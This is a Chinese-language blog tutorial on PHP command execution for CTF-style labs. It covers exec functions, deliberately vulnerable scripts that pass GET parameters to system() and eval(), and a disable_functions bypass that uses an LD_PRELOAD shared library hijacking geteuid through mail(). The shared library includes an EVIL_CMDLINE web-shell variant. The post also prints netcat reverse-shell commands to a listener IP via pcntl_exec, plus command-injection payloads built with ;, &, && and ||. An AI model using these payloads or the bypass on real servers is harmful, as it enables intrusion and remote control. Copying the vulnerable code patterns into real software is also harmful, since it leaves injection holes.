<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="2js56,2js56666@gmail.com"><title>PHP命令执行从0到1 · 2js56's blog</title><meta name="description" content="PHP命令执行从0到1命令执行函数介绍常见函数：常见的命令执行函数有：system,exec,passthru,shell_exec,反引号,popen,proc_open,pcntl_exec，我们需要关注它们怎么运行，运行的条件，参数以及能否回显。
systemsystem(string $co"><meta name="keywords" content="Hexo,HTML,CSS,web,Linux"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">2js56's blog</a></h3><div class="description"><p>love 林海青</p></div></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="http://github.com/2js56"><i class="fa fa-github"></i></a></li></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a target="_blank" rel="noopener" href="https://www.caicai.me"> CaiCai </a><span>&</span><a target="_blank" rel="noopener" href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">Home</a></li><li><a href="/about">Sobre</a></li><li><a href="/archives">Archivo</a></li><li><a href="/links">Enlaces</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/touxiang.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>PHP命令执行从0到1</a></h3></div><div class="post-content"><h1 id="PHP命令执行从0到1"><a href="#PHP命令执行从0到1" class="headerlink" title="PHP命令执行从0到1"></a>PHP命令执行从0到1</h1><h2 id="命令执行函数介绍"><a href="#命令执行函数介绍" class="headerlink" title="命令执行函数介绍"></a>命令执行函数介绍</h2><p><strong>常见函数：</strong><br>常见的命令执行函数有：<code>system</code>,<code>exec</code>,<code>passthru</code>,<code>shell_exec</code>,<code>反引号</code>,<code>popen</code>,<code>proc_open</code>,<code>pcntl_exec</code>，我们需要关注它们怎么运行，运行的条件，<u>参数</u>以及<u>能否回显</u>。</p>
<h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><p><code>system(string $command,int &amp;$return_var = ?)</code><br><code>command</code>:执行command参数所指定的命令，并且输出执行结果，如果提供<code>return_var</code>参数，则此外部命令执行后的返回状态将会被设置到此变量中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if(isset($cmd))&#123;</span><br><span class="line">    system($cmd);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>url传入<code>?cmd=ls</code>即可执行<code>system()</code>得到回显结果  </p>
<h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p><code>exec(string $command,array &amp;$output = ?,int &amp;$return_var = ?)</code><br><code>command</code>参数：要执行的命令。单独使用时只有最后一行结果，且不会回显<br><code>output</code>参数：用命令执行的输出填充此数组，每行输出填充数组中的一个元素。即逐行填充数组。<br>需要借用<code>print_r</code>输出结果。  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = &#x27;dir&#x27;;</span><br><span class="line">exec($cmd,$lhq);</span><br><span class="line">print_r($lhq);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>得到结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt;  Volume in drive C is Windows-SSD</span><br><span class="line">    [1] =&gt;  Volume Serial Number is 6A6D-471D</span><br><span class="line">    [2] =&gt;</span><br><span class="line">    [3] =&gt;  Directory of C:\Users\lenovo\Desktop\phptest     </span><br><span class="line">    [4] =&gt;</span><br><span class="line">    [5] =&gt; 2022/09/24  05:08    &lt;DIR&gt;          .</span><br><span class="line">    [6] =&gt; 2022/09/24  05:08    &lt;DIR&gt;          ..</span><br><span class="line">    [7] =&gt; 2022/09/29  03:16                58 1.php</span><br><span class="line">    [8] =&gt;                1 File(s)             58 bytes     </span><br><span class="line">    [9] =&gt;                2 Dir(s)  17,335,787,520 bytes free</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>示例：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">exec($cmd,$array);</span><br><span class="line">print_r($array);</span><br><span class="line">?&gt;</span><br><span class="line">//?cmd=ls</span><br></pre></td></tr></table></figure>
<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h3><p><code>passthru(string $command,int &amp;$return_var = ?)</code><br><code>command</code>参数：要执行的命令。<br>输出二进制数据，并且需要直接传送到浏览器。和<code>system</code>差不多<br>示例：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">echo &quot;This is test!!!&quot;;</span><br><span class="line">passthru($cmd);</span><br><span class="line">?&gt;</span><br><span class="line">//cmd=ls</span><br></pre></td></tr></table></figure>
<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h3><p><code>shell_exec(string $cmd)</code><br><code>cmd</code>参数：要执行的命令。<br>环境执行命令，并且将完整的输出以字符串的方式返回。(无回显)<strong>功能等同于反引号</strong><br>借用<code>echo</code>、<code>print</code>等输出结果<br>示例：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">$output = shell_exec($cmd);</span><br><span class="line">echo $output;</span><br><span class="line">?&gt;</span><br><span class="line">//cmd=ls</span><br></pre></td></tr></table></figure>
<h3 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h3><p>效果等同于<code>shell_exec</code>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">echo `$cmd,PHP_EOL;</span><br><span class="line">?&gt;</span><br><span class="line">//cmd=ls</span><br></pre></td></tr></table></figure>
<h3 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h3><p><code>popen(string $command,string $mode)</code><br><code>command</code>参数：要执行的命令。<br><code>mode</code>参数：模式。<code>&#39;r&#39;</code>表示阅读，<code>&#39;w&#39;</code>表示写入。<br><code>fgets</code>获取内容-&gt;<code>print_r</code>输出内容<br>示例：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">$lhq = popen($cmd,&#x27;r&#x27;);</span><br><span class="line">while($s=fgets($lhq))&#123;</span><br><span class="line">	print_r($s);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//cmd=ls</span><br></pre></td></tr></table></figure>
<h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h3><p><code>proc_open($command,$descriptor_spec,$pipes,$cwd,$env_vars,$options)</code><br><code>command</code>参数：要执行的命令。<br><code>descriptor_spec</code>参数：定义数组内容。<br><code>pipes</code>参数：调用数组内容<br>示例：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">$array = array(</span><br><span class="line">	array(&quot;pipe&quot;,&quot;r&quot;),</span><br><span class="line">	array(&quot;pipe&quot;,&quot;w&quot;),</span><br><span class="line">	array(&quot;file&quot;,&quot;/tmp/error-output.txt&quot;,&quot;a&quot;)</span><br><span class="line">);</span><br><span class="line">$fp = proc_open($cmd,$array,$pipes);</span><br><span class="line">echo stream_get_contents($pipes[1]);</span><br><span class="line">proc_close($fp);</span><br><span class="line">?&gt;</span><br><span class="line">//cmd=ls</span><br></pre></td></tr></table></figure>
<h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h3><p><code>pcntl_exec(string $path,array $args = ?,array $envs = ?)</code><br><code>path</code>必须是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本（比如文件第一行是#!&#x2F;usr&#x2F;local&#x2F;bin&#x2F;perl的perl脚本）。<br><code>args</code>是一个要传递给程序的参数的字符串数组。<br><code>envs</code>是一个要传递给程序作为环境变量的字符串数组。这个数组是key &#x3D;&gt; value格式的，<code>key</code>代表要传递的环境变量的名称, <code>value</code>代表该环境变量值。<br><strong>在当前进程空间执行指定程序。</strong></p>
<h2 id="替换绕过函数过滤"><a href="#替换绕过函数过滤" class="headerlink" title="替换绕过函数过滤"></a>替换绕过函数过滤</h2><p>例题：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">    if(preg_match(&quot;/exec|system|popen|proc_open|\`/i&quot;,$c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot; 你是黑客么？&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//?cmd=passthru(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
<h2 id="LD-PRELOAD绕过原理介绍"><a href="#LD-PRELOAD绕过原理介绍" class="headerlink" title="LD_PRELOAD绕过原理介绍"></a>LD_PRELOAD绕过原理介绍</h2><p><strong>LD_PRELOAD</strong><br>使用场景：<code>disable_functions</code>禁用所有可能用到的命令执行的函数  </p>
<h3 id="程序的链接"><a href="#程序的链接" class="headerlink" title="程序的链接"></a>程序的链接</h3><p>**静态链接:**在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。<br>**装入时动态链接:**源程序编译后所得到的一组目标模块，在装内存时，边装入边链接。<br>**运行时动态链接:**原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。  </p>
<p>对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布&#x2F;维护&#x2F;更新。  </p>
<p>动态链接：假如程序动态加载的函数是恶意的，就有可能导致<code>disable_function</code>被绕过。  </p>
<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p><strong>修改库文件</strong><br>它可以影响程序的运行时的链接（Runtime linker)，它允许你定义在程序运行前优先加载的动态链接库。<br>这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。<br>通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。<br>使用自己的或是更好的函数（无需别人的源码)也可以向别人的程序注入恶意程序<br>mail:内嵌在PHP里，imagick:需要扩展安装  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#vim demo.php</span><br><span class="line">&lt;?php</span><br><span class="line">mail(&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line">#strace -o 1.txt -f php demo.php</span><br><span class="line">把demo.php执行的动作，以文本方式记录在1.txt</span><br><span class="line"># cat 1.txt | grep execve</span><br><span class="line">检查调用了哪些子进程</span><br><span class="line">&quot;/usr/sbin/sendmail&quot;</span><br><span class="line">#readelf -Ws /usr/sbin/sendmail</span><br><span class="line">查看sendmail调用了哪些库文件</span><br></pre></td></tr></table></figure>
<p>里面有一个<code>geteuid</code> ,执行<code>#vim demo.c</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void payload()&#123;</span><br><span class="line">	system(&quot;echo &#x27;小可爱，你邮件还能发出去么？&#x27;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int geteuid()&#123;    //生成动作geteuid，执行payload</span><br><span class="line">	unsetenv(&quot;LD_PRELOAD&quot;); //结束调用</span><br><span class="line">	payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行<code>#gcc -shared -fPIC demo.c -o demo.so</code><br>将带有命令的c文件编译成.so文件，生成动态链接库文件<br>重新编辑demo.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD=./demo.so&quot;);   //加载动态链接库demo.so</span><br><span class="line">mail(&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><code>#php demo.php</code>输出<code>小可爱，你邮件还能发出去么？</code>  </p>
<ul>
<li>绕过条件：能够上传自己的.so文件；  </li>
<li>能够控制环境变量的值（设置LD_PRELOAD变量），比如<code>putenv</code>函数并且未被禁止；  </li>
<li>存在可以控制PHP启动外部程序的函数并能执行（因为新进程启动将加载<code>LD_PRELOAD</code>中的.so文件)，比如<code>mail()</code>、<code>imap_mail()</code>、<code> mb_send_mail()</code>和<code>error_log()</code>等。</li>
</ul>
<h2 id="mail-函数命令执行例题"><a href="#mail-函数命令执行例题" class="headerlink" title="mail()函数命令执行例题"></a>mail()函数命令执行例题</h2><p>例题源代码：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/www/admin/localhost_81/wwwroot/class02&#x27;.$dir);    //控制路径</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(issit($_POST[&#x27;cmd&#x27;]))&#123;   //POST方式提交cmd，eval执行</span><br><span class="line">    $cmd = $_POST[&#x27;cmd&#x27;];</span><br><span class="line">    if($cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        eval($cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;给你留个后门又能怎样？能拿到我根目录下的flag么？&quot;；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>info信息<br><code>disable_functions</code>禁用所有可能用到的命令执行的函数<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230929205813.png"><br>mail函数可用<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230929223744.png"><br>蚁剑测试连接成功<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230929224224.png"><br>蚁剑连接可以上传下载文件，但是不能执行命令<br>构造payload：<br>mail函数—–&gt;调用子程序”&#x2F;usr&#x2F;sbin&#x2F;sendmail”—–&gt;调用动态链接库geteuid函数<br>我们给geteuid重新赋值  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void payload()&#123;</span><br><span class="line">    system(&quot;cat /flag &gt; /tmp/flag&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int geteuid()&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用<code>#gcc -shared -fPIC demo.c -o demo.so</code>将带有命令的c文件编译成.so文件，生成动态链接库文件<br>demo.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD=./demo.so&quot;);   //加载动态链接库demo.so</span><br><span class="line">mail(&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>使用蚁剑上传demo.c和demo.php,然后访问demo.php，就可以看见tmp目录下多出来一个flag文件<br>但是这种方法执行一条命令就需要上传两个文件十分的麻烦，所以我们干脆将demo.c要执行的命令改为反弹shell的命令，如:<code>nc 192.168.1.161 7777 -e /bin/bash</code>，然后我们只需在kali中<code>nc -lvp 7777</code>监听7777端口，等待命令执行后即成功反弹shell，若这种方法无法成功，<br>可以执行的命令复制到环境变量EVIL_CMDLINE直接读取命令<br>demo.c:  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int geteuid()&#123;</span><br><span class="line">	const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line">	if(getenv(&quot;LD_PRELOAD&quot;) == NULL)&#123; return 0;&#125;</span><br><span class="line">	unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">	system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>demo.php:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = $_REQUEST[&quot;cmd&quot;];</span><br><span class="line">$out_path = $_REQUEST[&quot;outpath&quot;];</span><br><span class="line">$evil_cmdline = $cmd.&quot; &gt; &quot;.$out_path.&quot; 2&gt;&amp;1&quot;;</span><br><span class="line">echo &quot;&lt;br/&gt;&lt;b&gt;cmdline:&lt;/b&gt;&quot;.$evil_cmdline;</span><br><span class="line">putenv(&quot;EVIL_CMDLINE=&quot;.$evil_cmdline);</span><br><span class="line">$so_path = $_REQUEST[&quot;sopath&quot;];</span><br><span class="line">putenv(&quot;LD_PRELOAD=&quot;.$so_path);</span><br><span class="line">mail(&quot;&quot;,&quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line">echo &quot;&lt;br/&gt;&lt;b&gt;output:&lt;/b&gt;&lt;br/&gt;&quot;.nl2br(file_get_contents($out_path));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>要执行的系统命令<code>cmd</code><br><code>output</code>命令执行结果输出到指定路径下的文件<br><code>2&gt;&amp;1</code>将标准错误重定向到标准输出<br>打印显示实际在linux上执行的命令<br>将执行的命令，配置成系统环境变量<code>EVIL_CMDLINE</code><br><code>$sopath</code>指定恶意动态链接库<br>上传后访问<code>demo.php?cmd=ls&amp;output=/tmp/lhq&amp;sopath=./demo.so</code>  </p>
<h2 id="蚁剑及pcntl绕过函数过滤"><a href="#蚁剑及pcntl绕过函数过滤" class="headerlink" title="蚁剑及pcntl绕过函数过滤"></a>蚁剑及pcntl绕过函数过滤</h2><p>使用蚁剑的插件<code>绕过disable_functions</code>，此插件在蚁剑的插件市场中下载，蚁剑加载不出来插件库，这里可以手动导入或者进行代理科学上网，因为仓库在国外，不科学上网拉不下来插件。<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230930185309.png"><br>非常的方便！<br><strong>pcntl_exec函数</strong><br>需单独加载组件<br><code>pcntl_exec(string $path,array $args = ?,array $envs = ?)</code><br>参数path:必须是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本(比如文件第一行是<code>#!/usr/local/bin/perl</code>的perl脚本。<br>参数args:是一个要传递给程序的参数的字符串数组。<br>参数envs:是一个要传递给程序作为环境变量的字符串数组。<br>例如：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#ls</span><br><span class="line">#/bin/bash -c /bin/ls</span><br><span class="line">   path       args       </span><br></pre></td></tr></table></figure>
<p>info信息：没有禁用pcntl_exec函数<br>但是pcntl_exec函数没有回显<br>解决方法一：cat文件并输出到有权限读取路径；<br>解决方法二：shell反弹<br>例题源代码：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/www/admin/localhost_81/wwwroot/class02&#x27;.$dir);    //控制路径</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(issit($_POST[&#x27;cmd&#x27;]))&#123;   //POST方式提交cmd，eval执行</span><br><span class="line">    $cmd = $_POST[&#x27;cmd&#x27;];</span><br><span class="line">    if($cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        eval($cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;给你留个后门又能怎样？能拿到我根目录下的flag么？&quot;；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>POST提交：<code>cmd=pcntl_exec(&quot;/bin/bash&quot;,array(&quot;-c&quot;,&quot;nc 192.168.1.201 7777 -e /bin/bash&quot;));</code><br>参数<code>path</code>: “&#x2F;bin&#x2F;bash”  参数<code>args</code>: 以数组的形式包裹起来<br>-c 执行二进制文件  nc反弹tcp连接到kali，kali监听端口  -e &#x2F;bin&#x2F;bash 返回命令行交互界面  </p>
<h2 id="操作系统链接符"><a href="#操作系统链接符" class="headerlink" title="操作系统链接符"></a>操作系统链接符</h2><p>例题代码：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">if(isset($cmd))&#123;</span><br><span class="line">    system(&quot;ls&quot;.$cmd);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><code>;</code>：使多个命令按顺序执行 如：id;ls;pwd<br>提交<code>?cmd=;cat flag.php</code><br><code>&amp;</code>：使命令在后台运行，这样就可以同时执行多条命令<br>提交<code>?cmd=&amp;cat flag.php</code>，但是必须进行url编码，所以应该提交<code>?cmd=%26cat flag.php</code><br><code>&amp;&amp;</code>：如果前面的命令执行成功，则执行后面的命令<br>提交<code>?cmd=1%26%26idid</code>第一条命令无法执行成功，则后面的命令也无法执行<br><code>|</code>：将前面的命令的输出作为后面命令的输入，把前面命令的结果当成后面命令的参数;前面的命令和后面的命令都会执行，但只显示后面的命令执行结果。<br>如：<code>echo &quot;ls -l&quot;| /bin/bash</code><br><code>||</code>：类似于程序中的if-else语句。若前面的命令执行成功，则后面的命令就不会执行；若前面的命令执行失败，则执行后面的命令。<br>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">$cmd = $cmd.&quot;&gt;/dev/null 2&gt;&amp;1&quot;;//&gt;/dev/null 2&gt;&amp;1 把正常输出的错误输出全部丢入垃圾桶</span><br><span class="line">if(isset($cmd))&#123;</span><br><span class="line">    system(&quot;ls&quot;.$cmd);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>提交<code>?cmd=cat flag||</code>即可  </p>
